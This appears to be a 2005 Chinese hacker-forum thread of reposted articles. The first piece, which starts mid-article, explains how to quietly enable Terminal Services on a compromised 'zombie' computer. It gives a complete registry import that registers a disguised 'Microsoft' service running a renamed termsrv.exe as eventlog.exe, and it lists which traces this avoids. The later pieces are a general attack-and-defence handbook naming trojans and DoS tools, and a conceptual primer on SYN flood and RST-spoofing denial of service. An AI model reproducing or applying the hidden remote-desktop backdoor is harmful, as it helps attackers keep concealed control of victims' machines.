C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 变为 "已起动" 和"自动". 
D."肉机"中 "Windows 任务管理器-->进程" 内,增加 "Termsrv.exe". 
E.需要拷贝几兆的文件到"肉机"中. 

二.抛砖引玉性"隐蔽"安装: 

1.将"肉机"中 "c:\winnt\system32\termsrv.exe" 文件作一备份,命名为"eventlog.exe",仍将其放入目录 "c:\winnt\system32\" 

2.将如下注册表键值导入 "肉机" 的注册表中: 

------------ 
Windows Registry Editor Version 5.00 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] 
"Enabled"="0" 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"ShutdownWithoutLogon"="0" 

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] 
"EnableAdminTSRemote"=dword:00000001 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] 
"TSEnabled"=dword:00000001 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] 
"Start"=dword:00000002 

[HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] 
"Hotkey"="1" 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecuService] 
"Start"=dword:00000002 
"ErrorControl"=dword:00000001 
"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\ 
74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,65,\ 
00,76,00,65,00,6e,00,74,00,6c,00,6f,00,67,00,2e,00,65,00,78,00,65,00,00,00 
"ObjectName"="LocalSystem" 
"Type"=dword:00000010 
"Description"="Microsoft" 
"DisplayName"="Microsoft" 

--------------- 

3.重新起动"肉机"。 

4.使用本地的3398客户端，连接“肉机”。 

5.优(缺)点: 

A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 仍然处于未安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 没有任何变动. 
C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 没有变化,保持原始状态. 
D."肉机"中 "开始-->程序-->管理工具-->服务" 增加 "Microsoft" 
E."肉机"中 "Windows 任务管理器-->进程" 内,增加 "eventlog.exe". 

三.理论简介 

如此简单? 只修改注册表? 不需要拷贝W2k源文件? 

让我们从一条命令行语句说起,这条语句是: "sysocmgr /iysoc.inf /u:u.txt /q" . 其中 u.txt 如下: 
------------- 
[Components] 
TsEnable = on 
------------- 

首先认识 "sysoc.inf"."sysoc.inf" 是安装信息文件,位于 "c:\winnt\inf". 打开它,在 "[Components]" 节,找到与 "终端服务" 有关的条目: 

"TerminalServices=TsOc.dll, HydraOc, TsOc.inf,,2" 

这里引出另外一个安装信息文件: "TsOc.inf". 这个文件同样位于 "c:\winnt\inf". 

打开这个文件,你会发现,如同 windows 环境下的软件安装, "终端服务" 的安装, 也主要由三个部分: 拷贝源文件,注册 DLL 以及修改注册表. 

在 [TerminalServices.FreshInstall] 节 和 "File Sections" 部分,你会发现 "终端服务" 所需的系统文件,DLL 和驱动, 随同 W2k 的初始安装,都已安然就位. 

为什么 "终端服务" 的常规安装和命令行安装都需要拷贝W2k源文件? 事实上,所拷贝的是"终端服务"客户端软件,既 "开始-->程序-->管理工具-->终端服务客户端生成器" 生成客户软盘需要的文件. 

各位 "黑友" 提供的包或工具,里面包括的W2k源文件,都是 "tsc32" 打头的. 关连 "TsOc.inf" 的 "File Sections" 部分和另外一个文件 "c:\winnt\inf\layout.inf",你将会得到证实. 

"终端服务"的安装,需要注册俩个 "DLL". 这俩个 "DLL" 同样早早就住在系统里,想必它们一定也有了身份证. 

"TsOc.inf" 文件一半的内容是关于修改注册表. 但"终端服务" 需要的"Reg.AddToFreshInstall, Reg.AddTo50, Reg.AddTo40" 都是在系统安装时注册过的. 

我们回头看一下那个命令行语句, "/u:" 参数后面的无人职守安装信息文件 "u.txt". "TsEnable = on" ? 

"TsOc.inf" 文件 [Optional Components] 节中有三个选项, "TerminalServices", "TSEnable" ,"TSClients". 

"TerminalServices" 如上所述,在系统初始安装时,已经就序. "TSClients" 与 "终端服务" 没有直接的关系. 

我们在 "TsOc.inf" 找到 "[TsEnable]" 节. 此节中有用的信息只有一条 "ToggleOnSection = TerminalServices.ToggleOn". 再转到 [TerminalServices.ToggleOn] 节. 

[TerminalServices.ToggleOn] 节告诉我们,下一站是 "Reg.ToggleOn", 沿着这个线索,我们来到 [Reg.ToggleOn], 你看到什么? 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:03pm 

网络常见攻击及防范手册（上） 


一、前言 

　　在网络这个不断更新换代的世界里，网络中的安全漏洞无处不在。即便旧的安全漏洞补上了，新的安全漏洞又将不断涌现。网络攻击正是利用这些存在的漏 洞和安全缺陷对系统和资源进行攻击。 

　　也许有人会对网络安全抱着无所谓的态度，认为最多不过是被攻击者盗用账号，造不成多大的危害。他们往往会认为“安全”只是针对那些大中型企事业单位和网站而言。其实，单从技术上说，黑客入侵的动机是成为目标主机的主人。只要他们获得了一台网络主机的超级用户权限后他们就有可能在该主机上修改资源配置、安置“特洛伊”程序、隐藏行踪、执行任意进程等等。我们谁又愿意别人在我们的机器上肆无忌惮地拥有这些特权呢？更何况这些攻击者的动机也不都是那么单纯。因此，我们每一个人都有可能面临着安全威胁，都有必要对网络安全有所了解，并能够处理一些安全方面的问题。 

　　下面我们就来看一下那些攻击者是如何找到你计算机中的安全漏洞的，并了解一下他们的攻击手法。 

　　二、网络攻击的步骤 

　　第一步：隐藏自已的位置 

　　普通攻击者都会利用别人的电脑隐藏他们真实的IP地址。老练的攻击者还会利用800电话的无人转接服务联接ISP，然后再盗用他人的帐号上网。 

　　第二步：寻找目标主机并分析目标主机 

　　攻击者首先要寻找目标主机并分析目标主机。在Internet上能真正标识主机的是IP地址，域名是为了便于记忆主机的IP地址而另起的名字，只要利用域名和IP地址就可以顺利地找到目标主机。当然，知道了要攻击目标的位置还是远远不够的，还必须将主机的操作系统类型及其所提供服务等资料作个全面的了解。此时，攻击者们会使用一些扫描器工具，轻松获取目标主机运行的是哪种操作系统的哪个版本，系统有哪些帐户，WWW、FTP、Telnet 、SMTP等服务器程序是何种版本等资料，为入侵作好充分的准备。 

　　第三步：获取帐号和密码，登录主机 

　　攻击者要想入侵一台主机，首先要有该主机的一个帐号和密码，否则连登录都无法进行。这样常迫使他们先设法盗窃帐户文件，进行破解，从中获取某用户的帐户和口令，再寻觅合适时机以此身份进入主机。当然，利用某些工具或系统漏洞登录主机也是攻击者常用的一种技法。 

　　第四步：获得控制权 

　　攻击者们用FTP、Telnet等工具利用系统漏洞进入进入目标主机系统获得控制权之后，就会做两件事：清除记录和留下后门。他会更改某些系统设置、在系统中置入特洛伊木马或其他一些远程操纵程序，以便日后可以不被觉察地再次进入系统。大多数后门程序是预先编译好的，只需要想办法修改时间和权限就可以使用了，甚至新文件的大小都和原文件一模一样。攻击者一般会使用rep传递这些文件，以便不留下FTB记录。清除日志、删除拷贝的文件等手段来隐藏自己的踪迹之后，攻击者就开始下一步的行动。 

　　第五步：窃取网络资源和特权 

　　攻击者找到攻击目标后，会继续下一步的攻击。如：下载敏感信息；实施窃取帐号密码、信用卡号等经济偷窃；使网络瘫痪。 

三、网络攻击的原理和手法 

　　1、口令入侵 

　　所谓口令入侵是指使用某些合法用户的帐号和口令登录到目的主机，然后再实施攻击活动。这种方法的前提是必须先得到该主机上的某个合法用户的帐号，然后再进行合法用户口令的破译。获得普通用户帐号的方法很多，如 

　　利用目标主机的Finger功能：当用Finger命令查询时，主机系统会将保存的用户资料（如用户名、登录时间等）显示在终端或计算机上； 
　　利用目标主机的X.500服务：有些主机没有关闭X.500的目录查询服务，也给攻击者提供了获得信息的一条简易途径； 
　　从电子邮件地址中收集：有些用户电子邮件地址常会透露其在目标主机上的帐号； 
　　查看主机是否有习惯性的帐号：有经验的用户都知道，很多系统会使用一些习惯性的帐号，造成帐号的泄露。 

　　这又有三种方法： 

　　(1)是通过网络监听非法得到用户口令，这类方法有一定的局限性，但危害性极大。监听者往往采用中途截击的方法也是获取用户帐户和密码的一条有效途径。当下，很多协议根本就没有采用任何加密或身份认证技术，如在Telnet、FTP、HTTP、SMTP等传输协议中，用户帐户和密码信息都是以明文格式传输的，此时若攻击者利用数据包截取工具便可很容易收集到你的帐户和密码。还有一种中途截击攻击方法更为厉害，它可以在你同服务器端完成“三次握手”建立连接之后，在通信过程中扮演“第三者”的角色，假冒服务器身份欺骗你，再假冒你向服务器发出恶意请求，其造成的后果不堪设想。另外，攻击者有时还会利用软件和硬件工具时刻监视系统主机的工作，等待记录用户登录信息，从而取得用户密码；或者编制有缓冲区溢出错误的SUID程序来获得超级用户权限。 

　　(2)是在知道用户的账号后（如电子邮件@前面的部分）利用一些专门软件强行破解用户口令，这种方法不受网段限制，但攻击者要有足够的耐心和时间。如：采用字典穷举法（或称暴力法）来破解用户的密码。攻击者可以通过一些工具程序，自动地从电脑字典中取出一个单词，作为用户的口令，再输入给远端的主机，申请进入系统；若口令错误，就按序取出下一个单词，进行下一个尝试，并一直循环下去，直到找到正确的口令或字典的单词试完为止。由于这个破译过程由计算机程序来自动完成，因而几个小时就可以把上十万条记录的字典里所有单词都尝试一遍。 

　　(3)是利用系统管理员的失误。在现代的Unix操作系统中，用户的基本信息存放在passwd文件中，而所有的口令则经过DES加密方法加密后专门存放在一个叫shadow的文件中。黑客们获取口令文件后，就会使用专门的破解DES加密法的程序来解口令。同时，由于为数不少的操作系统都存在许多安全漏洞、Bug或一些其他设计缺陷，这些缺陷一旦被找出，黑客就可以长驱直入。例如，让Windows95／98系统后门洞开的BO就是利用了Windows的基本设计缺陷。 
2、放置特洛伊木马程序 

　　特洛伊木马程序可以直接侵入用户的电脑并进行破坏，它常被伪装成工具程序或者游戏等诱使用户打开带有特洛伊木马程序的邮件附件或从网上直接下载，一旦用户打开了这些邮件的附件或者执行了这些程序之后，它们就会象古特洛伊人在敌人城外留下的藏满士兵的木马一样留在自己的电脑中，并在自己的计算机系统中隐藏一个可以在windows启动时悄悄执行的程序。当您连接到因特网上时，这个程序就会通知攻击者，来报告您的IP地址以及预先设定的端口。攻击者在收到这些信息后，再利用这个潜伏在其中的程序，就可以任意地修改你的计算机的参数设定、复制文件、窥视你整个硬盘中的内容等，从而达到控制你的计算机的目的。 

　　3、WWW的欺骗技术 

　　在网上用户可以利用IE等浏览器进行各种各样的WEB站点的访问，如阅读新闻组、咨询产品价格、订阅报纸、电子商务等。然而一般的用户恐怕不会想到有这些问题存在：正在访问的网页已经被黑客篡改过，网页上的信息是虚假的！例如黑客将用户要浏览的网页的URL改写为指向黑客自己的服务器，当用户浏览目标网页的时候，实际上是向黑客服务器发出请求，那么黑客就可以达到欺骗的目的了。 

　　一般Web欺骗使用两种技术手段，即URL地址重写技术和相关信关信息掩盖技术。利用URL地址，使这些地址都向攻击者的Web服务器，即攻击者可以将自已的Web地址加在所有URL地址的前面。这样，当用户与站点进行安全链接时，就会毫不防备地进入攻击者的服器，于是用记的所有信息便处于攻击者的监视之中。但由于浏览器材一般均设有地址栏和状态栏，当浏览器与某个站点边接时，可以在地址栏和状态样中获得连接中的Web站点地址及其相关的传输信息，用户由此可以发现问题，所以攻击者往往在URLf址重写的同时，利用相关信息排盖技术，即一般用javascript程序来重写地址样和状枋样，以达到其排盖欺骗的目的。 

　　4、电子邮件攻击 

　　电子邮件是互联网上运用得十分广泛的一种通讯方式。攻击者可以使用一些邮件炸弹软件或CGI程序向目的邮箱发送大量内容重复、无用的垃圾邮件，从而使目的邮箱被撑爆而无法使用。当垃圾邮件的发送流量特别大时，还有可能造成邮件系统对于正常的工作反映缓慢，甚至瘫痪。相对于其它的攻击手段来说，这种攻击方法具有简单、见效快等优点。 

　　电子邮件攻击主要表现为两种方式： 

　　(1)是电子邮件轰炸和电子邮件“滚雪球”，也就是通常所说的邮件炸弹，指的是用伪造的IP地址和电子邮件地址向同一信箱发送数以千计、万计甚至无穷多次的内容相同的垃圾邮件，致使受害人邮箱被“炸”，严重者可能会给电子邮件服务器操作系统带来危险，甚至瘫痪； 

　　(2)是电子邮件欺骗，攻击者佯称自己为系统管理员（邮件地址和系统管理员完全相同），给用户发送邮件要求用户修改口令（口令可能为指定字符串）或在貌似正常的附件中加载病毒或其他木马程序。 
5、通过一个节点来攻击其他节点 

　　攻击者在突破一台主机后，往往以此主机作为根据地，攻击其他主机(以隐蔽其入侵路径，避免留下蛛丝马迹)。他们可以使用网络监听方法，尝试攻破同一网络内的其他主机；也可以通过IP欺骗和主机信任关系，攻击其他主机。 

　　这类攻击很狡猾，但由于某些技术很难掌握，如TCP／IP欺骗攻击。攻击者通过外部计算机伪装成另一台合法机器来实现。它能磙坏两台机器间通信链路上的数据，其伪装的目的在于哄骗网络中的其它机器误将其攻击者作为合法机器加以接受，诱使其它机器向他发送据或允许它修改数据。TCP／IP欺骗可以发生TCP／IP系统的所有层次上，包括数据链路层、网络层、运输层及应用层均容易受到影响。如果底层受到损害，则应用层的所有协议都将处于危险之中。另外由于用户本身不直接与底层相互相交流，因而对底层的攻击更具有欺骗性。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:03pm 

网络常见攻击及防范手册（下） 


　6、网络监听 

　　网络监听是主机的一种工作模式，在这种模式下，主机可以接收到本网段在同一条物理通道上传输的所有信息，而不管这些信息的发送方和接收方是谁。因为系统在进行密码校验时，用户输入的密码需要从用户端传送到服务器端，而攻击者就能在两端之间进行数据监听。此时若两台主机进行通信的信息没有加密，只要使用某些网络监听工具(如NetXRay for Windows95／98／NT、Sniffit for Linux、Solaries等)就可轻而易举地截取包括口令和帐号在内的信息资料。虽然网络监听获得的用户帐号和口令具有一定的局限性，但监听者往往能够获得其所在网段的所有用户帐号及口令。 

　　7、利用黑客软件攻击 

　　利用黑客软件攻击是互联网上比较多的一种攻击手法。Back Orifice2000、冰河等都是比较著名的特洛伊木马，它们可以非法地取得用户电脑的超级用户级权利，可以对其进行完全的控制，除了可以进行文件操作外，同时也可以进行对方桌面抓图、取得密码等操作。这些黑客软件分为服务器端和用户端，当黑客进行攻击时，会使用用户端程序登陆上已安装好服务器端程序的电脑，这些服务器端程序都比较小，一般会随附带于某些软件上。有可能当用户下载了一个小游戏并运行时，黑客软件的服务器端就安装完成了，而且大部分黑客软件的重生能力比较强，给用户进行清除造成一定的麻烦。特别是最近出现了一种TXT文件欺骗手法，表面看上去是一个TXT文本文件，但实际上却是一个附带黑客程序的可执行程序，另外有些程序也会伪装成图片和其他格式的文件。 

　　8、安全漏洞攻击 

　　许多系统都有这样那样的安全漏洞（Bugs）。其中一些是操作系统或应用软件本身具有的。如缓冲区溢出攻击。由于很多系统在不检查程序与缓冲之间变化的情况，就任意接受任意长度的数据输入，把溢出的数据放在堆栈里，系统还照常执行命令。这样攻击者只要发送超出缓冲区所能处理的长度的指令，系统便进入不稳定状态。若攻击者特别配置一串准备用作攻击的字符，他甚至可以访问根目录，从而拥有对整个网络的绝对控制权。另一些是利用协议漏洞进行攻击。如攻击者利用POP3一定要在根目录下运行的这一漏洞发动攻击，破坏的根目录，从而获得超级用户的权限。又如，ICMP协议也经常被用于发动拒绝服务攻击。它的具体手法就是向目的服务器发送大量的数据包，几乎占取该服务器所有的网络宽带，从而使其无法对正常的服务请求进行处理，而导致网站无法进入、网站响应速度大大降低或服务器瘫痪。现在常见的蠕虫病毒或与其同类的病毒都可以对服务器进行拒绝服务攻击的进攻。它们的繁殖能力极强，一般通过Microsoft的Outlook软件向众多邮箱发出带有病毒的邮件，而使邮件服务器无法承担如此庞大的数据处理量而瘫痪。对于个人上网用户而言，也有可能遭到大量数据包的攻击使其无法进行正常的网络操作。 

　　9、端口扫描攻击 

　　所谓端口扫描，就是利用Socket编程与目标主机的某些端口建立TCP连接、进行传输协议的验证等，从而侦知目标主机的扫描端口是否是处于激活状态、主机提供了哪些服务、提供的服务中是否含有某些缺陷等等。常用的扫描方式有：Connect()扫描。Fragmentation扫描 
四、攻击者常用的攻击工具 

　　1、DOS攻击工具： 

　　如WinNuke通过发送OOB漏洞导致系统蓝屏；Bonk通过发送大量伪造的UDP数据包导致系统重启；TearDrop通过发送重叠的IP碎片导致系统的TCP/IP栈崩溃；WinArp通过发特殊数据包在对方机器上产生大量的窗口；Land通过发送大量伪造源IP的基于SYN的TCP请求导致系统重启动；FluShot通过发送特定IP包导致系统凝固；Bloo通过发送大量的ICMP数据包导致系统变慢甚至凝固；PIMP通过IGMP漏洞导致系统蓝屏甚至重新启动；Jolt通过大量伪造的ICMP和UDP导致系统变的非常慢甚至重新启动。 

　　2、木马程序 

　　(1)、BO2000(BackOrifice)：它是功能最全的TCP／IP构架的攻击工具，可以搜集信息，执行系统命令，重新设置机器，重新定向网络的客户端／服务器应用程序。BO2000支持多个网络协议，它可以利用TCP或UDP来传送，还可以用XOR加密算法或更高级的3DES加密算法加密。感染BO2000后机器就完全在别人的控制之下，黑客成了超级用户，你的所有操作都可由BO2000自带的“秘密摄像机”录制成“录像带”。 

　　(2)、“冰河”：冰河是一个国产木马程序，具有简单的中文使用界面，且只有少数流行的反病毒、防火墙才能查出冰河的存在。冰河的功能比起国外的木马程序来一点也不逊色。 它可以自动跟踪目标机器的屏幕变化，可以完全模拟键盘及鼠标输入，即在使被控端屏幕变化和监控端产生同步的同时，被监控端的一切键盘及鼠标操作将反映在控端的屏幕。它可以记录各种口令信息，包括开机口令、屏保口令、各种共享资源口令以及绝大多数在对话框中出现过的口令信息；它可以获取系统信息；它还可以进行注册表操作，包括对主键的浏览、增删、复制、重命名和对键值的读写等所有注册表操作。 

　　(3)、NetSpy：可以运行于Windows95／98／NT／2000等多种平台上，它是一个基于TCP／IP的简单的文件传送软件，但实际上你可以将它看作一个没有权限控制的增强型FTP服务器。通过它，攻击者可以神不知鬼不觉地下载和上传目标机器上的任意文件，并可以执行一些特殊的操作。 

　　(4)、Glacier：该程序可以自动跟踪目标计算机的屏幕变化、获取目标计算机登录口令及各种密码类信息、获取目标计算机系统信息、限制目标计算机系统功能、任意操作目标计算机文件及目录、远程关机、发送信息等多种监控功能。类似于BO2000。 

　　(5)、KeyboardGhost：Windows系统是一个以消息循环(MessageLoop)为基础的操作系统。系统的核心区保留了一定的字节作为键盘输入的缓冲区，其数据结构形式是队列。键盘幽灵正是通过直接访问这一队列，使键盘上输入你的电子邮箱、代理的账号、密码Password（显示在屏幕上的是星号）得以记录，一切涉及以星号形式显示出来的密码窗口的所有符号都会被记录下来，并在系统根目录下生成一文件名为KG.DAT的隐含文件。 

　　(6)、ExeBind：这个程序可以将指定的攻击程序捆绑到任何一个广为传播的热门软件上，使宿主程序执行时，寄生程序也在后台被执行，且支持多重捆绑。实际上是通过多次分割文件，多次从父进程中调用子进程来实现的。 
五、网络攻击应对策略 

　　在对网络攻击进行上述分析与识别的基础上，我们应当认真制定有针对性的策略。明确安全对象，设置强有力的安全保障体系。有的放矢，在网络中层层设防，发挥网络的每层作用，使每一层都成为一道关卡，从而让攻击者无隙可钻、无计可使。还必须做到未雨稠缪，预防为主 ，将重要的数据备份并时刻注意系统运行状况。以下是针对众多令人担心的网络安全问题，提出的几点建议 

　　1、提高安全意识 

　　(1)不要随意打开来历不明的电子邮件及文件，不要随便运行不太了解的人给你的程序，比如“特洛伊”类黑客程序就需要骗你运行。 
　　(2)尽量避免从Internet下载不知名的软件、游戏程序。即使从知名的网站下载的软件也要及时用最新的病毒和木马查杀软件对软件和系统进行扫描。 
　　(3)密码设置尽可能使用字母数字混排，单纯的英文或者数字很容易穷举。将常用的密码设置不同，防止被人查出一个，连带到重要密码。重要密码最好经常更换。 
　　(4)及时下载安装系统补丁程序。 
　　(5)不随便运行黑客程序，不少这类程序运行时会发出你的个人信息。 
　　(6)在支持HTML的BBS上，如发现提交警告，先看源代码，很可能是骗取密码的陷阱。 

　　2、使用防毒、防黑等防火墙软件。 

　　防火墙是一个用以阻止网络中的黑客访问某个机构网络的屏障，也可称之为控制进/出两个方向通信的门槛。在网络边界上通过建立起来的相应网络通信监控系统来隔离内部和外部网络，以阻档外部网络的侵入。 

　　3、设置代理服务器，隐藏自已的IP地址。 

　　保护自己的IP地址是很重要的。事实上，即便你的机器上被安装了木马程序，若没有你的IP地址，攻击者也是没有办法的，而保护IP地址的最好方法就是设置代理服务器。代理服务器能起到外部网络申请访问内部网络的中间转接作用，其功能类似于一个数据转发器，它主要控制哪些用户能访问哪些服务类型。当外部网络向内部网络申请某种网络服务时，代理服务器接受申请，然后它根据其服务类型、服务内容、被服务的对象、服务者申请的时间、申请者的域名范围等来决定是否接受此项服务，如果接受，它就向内部网络转发这项请求。 

　　4、将防毒、防黑当成日常例性工作，定时更新防毒组件，将防毒软件保持在常驻状态，以彻底防毒。 

　　5、由于黑客经常会针对特定的日期发动攻击，计算机用户在此期间应特别提高警戒。 

　　6、对于重要的个人资料做好严密的保护，并养成资料备份的习惯。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:03pm 

DOS攻击原理及方法介绍 


已经有很多介绍DOS（Denial of Service，即拒绝服务）攻击的文章，但是，多数人还是不知道DOS到底是什么，它到底是怎么实现的。本文主要介绍DOS的机理和常见的实施方法。因前段时间仔细了解了TCP/IP协议以及RFC文档，有点心得。同时，文中有部分内容参考了Shaft的文章翻译而得
。要想了解DOS攻击得实现机理，必须对TCP有一定的了解。所以，本文分为两部分，第一部分介绍一
些实现DOS攻击相关的协议，第二部分则介绍DOS的常见方式。 

1、 什么是DOS攻击
DOS：即Denial Of Service，拒绝服务的缩写，可不能认为是微软的dos操作系统了。好象在5・1的时候闹过这样的笑话。拒绝服务，就相当于必胜客在客满的时候不再让人进去一样，呵呵，你想吃馅饼，就必须在门口等吧。DOS攻击即攻击者想办法让目标机器停止提供服务或资源访问，这些资源包括磁盘空间、内存、进程甚至网络带宽，从而阻止正常用户的访问。比如：
* 试图FLOOD服务器，阻止合法的网络通?br>* 破坏两个机器间的连接，阻止访问服务
* 阻止特殊用户访问服务
* 破坏服务器的服务或者导致服务器死机
不过，只有那些比较阴险的攻击者才单独使用DOS攻击，破坏服务器。通常，DOS攻击会被作为一次入侵的一部分，比如，绕过入侵检测系统的时候，通常从用大量的攻击出发，导致入侵检测系统日志过多或者反应迟钝，这样，入侵者就可以在潮水般的攻击中混骗过入侵检测系统。 

2、有关TCP协议的东西
TCP（transmission control protocol，传输控制协议），是用来在不可靠的因特网上提供可靠的、端到端的字节流通讯协议，在RFC793中有正式定义，还有一些解决错误的东西在RFC 1122中有记录，RFC 1323则有TCP的功能扩展。 

我们常见到的TCP/IP协议中，IP层不保证将数据报正确传送到目的地，TCP则从本地机器接受用户的数据流，将其分成不超过64K字节的数据片段，将每个数据片段作为单独的IP数据包发送出去，最后在目的地机器中再组合成完整的字节流，TCP协议必须保证可靠性。 

发送和接收方的TCP传输以数据段的形式交换数据，一个数据段包括一个固定的20字节头，加上可选部分，后面再跟上数据，TCP协议从发送方传送一个数据段的时候，还要启动计时器，当数据段到达目的地后，接收方还要发送回一个数据段，其中有一个确认序号，它等于希望收到的下一个数据段的顺序号，如果计时器在确认信息到达前超时了，发送方会重新发送这个数据段。 

上面，我们总体上了解一点TCP协议，重要的是要熟悉TCP的数据头（header）。因为数据流的传输最重要的就是header里面的东西，至于发送的数据，只是header附带上的。客户端和服务端的服务响应就是同header里面的数据相关，两端的信息交流和交换是根据header中的内容实施的，因此，要实现DOS，就必须对header中的内容非常熟悉。 

下面是TCP数据段头格式。
Source Port和 Destination Port :是本地端口和目标端口
Sequence Number 和 Acknowledgment Number ：是顺序号和确认号，确认号是希望接收的字节号。这都是32位的，在TCP流中，每个数据字节都被编号。Data offset :表明TCP头包含多少个32位字，用来确定头的长度，因为头中可选字段长度是不定的。Reserved : 保留的6位，现在没用，都是0
接下来是6个1位的标志，这是两个计算机数据交流的信息标志。接收和发送断根据这些标志来确定信息流的种类。下面是一些介绍： URG：（Urgent Pointer field significant）紧急指针。用到的时候值为1，用来处理避免TCP数据流中断ACK：（Acknowledgment field significant）置1时表示确认号（Acknowledgment Number）为合法，为0的时候表示数据段不包含确认信息，确认号被忽略。
PSH：（Push Function），PUSH标志的数据，置1时请求的数据段在接收方得到后就可直接送到应用程序，而不必等到缓冲区满时才传送。
RST：（Reset the connection）用于复位因某种原因引起出现的错误连接，也用来拒绝非法数据和请求。如果
接收到RST位时候，通常发生了某些错误。
SYN：（Synchronize sequence numbers）用来建立连接，在连接请求中，SYN=1，CK=0，连接响应时，SYN=1，
ACK=1。即，SYN和ACK来区分Connection Request和Connection Accepted。
FIN：（No more data from sender）用来释放连接，表明发送方已经没有数据发送。 

知道这重要的6个指示标志后，我们继续来。
16位的WINDOW字段：表示确认了字节后还可以发送多少字节。可以为0，表示已经收到包括确认号减1（即已发送所有数据）
在内的所有数据段。
接下来是16位的Checksum字段，用来确保可靠性的。
16位的Urgent Pointer，和下面的字段我们这里不解释了。不然太多了。呵呵，偷懒啊。 

我们进入比较重要的一部分：TCP连接握手过程。这个过程简单地分为三步。在没有连接中，接受方（我们针对服务器），服务器处于LISTEN状态，等待其他机器发送连接请求。
第一步：客户端发送一个带SYN位的请求，向服务器表示需要连接，比如发送包假设请求序号为10，那么则为：SYN=10，ACK=0，然后等待服务器的响应。
第二步：服务器接收到这样的请求后，查看是否在LISTEN的是指定的端口，不然，就发送RST=1应答，拒绝建立连接。如果接收连接，那么服务器发送确认，SYN为服务器的一个内码，假设为100，ACK位则是客户端的请求序号加1，本例中发送的数据是：SYN=100，ACK=11，用这样的数据发送给客户端。向客户端表示，服务器连接已经准备好了，等待客户端的确认这时客户端接收到消息后，分析得到的信息，准备发送确认连接信号到服务器
第三步：客户端发送确认建立连接的消息给服务器。确认信息的SYN位是服务器发送的ACK位，ACK位是服务器发送的SYN位加1。即：SYN=11，ACK=101。
这时，连接已经建立起来了。然后发送数据，<SYN=11，ACK=101><DATA>。这是一个基本的请求和连接过程。需要注意的是这些标志位的关系，比如SYN、ACK。 

3、服务器的缓冲区队列（Backlog Queue）
服务器不会在每次接收到SYN请求就立刻同客户端建立连接，而是为连接请求分配内存空间，建立会话，并放到一个等待队列中。如果，这个等待的队列已经满了，那么，服务器就不在为新的连接分配任何东西，直接丢弃新的请求。如果到了这样的地步，服务器就是拒绝服务了。
如果服务器接收到一个RST位信息，那么就认为这是一个有错误的数据段，会根据客户端IP，把这样的连接在缓冲区队列中清除掉。这对IP欺骗有影响，也能被利用来做DOS攻击。 

#################################################################### 

上面的介绍，我们了解TCP协议，以及连接过程。要对SERVER实施拒绝服务攻击，实质上的方式就是有两个：
一， 迫使服务器的缓冲区满，不接收新的请求。
二， 使用IP欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接
这就是DOS攻击实施的基本思想。具体实现有这样的方法： 

1、SYN FLOOD
利用服务器的连接缓冲区（Backlog Queue），利用特殊的程序，设置TCP的Header，向服务器端不断地成倍发送只有SYN标志的TCP连接请求。当服务器接收的时候，都认为是没有建立起来的连接请求，于是为这些请求建立会话，排到缓冲区队列中。
如果你的SYN请求超过了服务器能容纳的限度，缓冲区队列满，那么服务器就不再接收新的请求了。其他合法用户的连接都被拒绝掉。可以持续你的SYN请求发送，直到缓冲区中都是你的只有SYN标记的请求。现在有很多实施SYN FLOOD的工具，呵呵，自己找去吧。 

2、IP欺骗DOS攻击
这种攻击利用RST位来实现。假设现在有一个合法用户(1.1.1.1)已经同服务器建立了正常的连接，攻击者构造攻击的TCP数据，伪装自己的IP为1.1.1.1，并向服务器发送一个带有RST位的TCP数据段。服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中建立好的连接。这时，如果合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就必
须从新开始建立连接。攻击时，伪造大量的IP地址，向目标发送RST数据，使服务器不对合法用户服务。 

3、 带宽DOS攻击
如果你的连接带宽足够大而服务器又不是很大，你可以发送请求，来消耗服务器的缓冲区消耗服务器的带宽。这种攻击就是人多力量大了，配合上SYN一起实施DOS，威力巨大。不过是初级DOS攻击。呵呵。Ping白宫？？你发疯了啊！ 


4、自身消耗的DOS攻击
这是一种老式的攻击手法。说老式，是因为老式的系统有这样的自身BUG。比如Win95 (winsock v1), Cisco IOS v.10.x, 和其他过时的系统。
这种DOS攻击就是把请求客户端IP和端口弄成主机的IP端口相同，发送给主机。使得主机给自己发送TCP请求和连接。这种主机的漏洞会很快把资源消耗光。直接导致当机。这中伪装对一些身份认证系统还是威胁巨大的。
上面这些实施DOS攻击的手段最主要的就是构造需要的TCP数据，充分利用TCP协议。这些攻击方法都是建立在TCP基础上的。还
有其他的DOS攻击手段。 

5、塞满服务器的硬盘
通常，如果服务器可以没有限制地执行写操作，那么都能成为塞满硬盘造成DOS攻击的途径，比如：
发送垃圾邮件。一般公司的服务器可能把邮件服务器和WEB服务器都放在一起。破坏者可以发送大量的垃圾邮件，这些邮件可能都塞在一个邮件队列中或者就是坏邮件队列中，直到邮箱被撑破或者把硬盘塞满。
让日志记录满。入侵者可以构造大量的错误信息发送出来，服务器记录这些错误，可能就造成日志文件非常庞大，甚至会塞满硬盘。同时会让管理员痛苦地面对大量的日志，甚至就不能发现入侵者真正的入侵途径。
向匿名FTP塞垃圾文件。这样也可以塞满硬盘空间。 

6、合理利用策略
